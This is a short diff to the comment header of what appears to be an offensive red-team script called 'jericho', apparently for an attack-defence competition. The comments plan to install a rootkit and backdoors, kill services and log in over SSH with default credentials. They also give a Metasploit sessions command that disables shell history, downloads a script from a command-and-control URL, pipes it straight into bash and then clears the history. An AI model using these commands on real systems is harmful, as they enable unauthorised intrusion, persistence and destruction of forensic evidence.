@@ -4,7 +4,7 @@
 # install rootkit & backd00rz
 # kill services
 # likely usage: msf ssh_login to all of the folks who didn't change the default competition creds.
-# drop shells, then: sessions -c "export HISTFILE=/dev/null; wget -q $C2_URL/jericho2.1.sh -O /dev/stdout | /bin/bash - && history -c"
+# drop shells, then: sessions -c "export HISTFILE=/dev/null; wget -q $C2_URL/scripts/jericho2.1.sh -O /dev/stdout | /bin/bash - && history -c"
 #
 # why jericho? 
 # because tony stark. https://www.youtube.com/watch?v=YBC1Qob27sM&t=38s
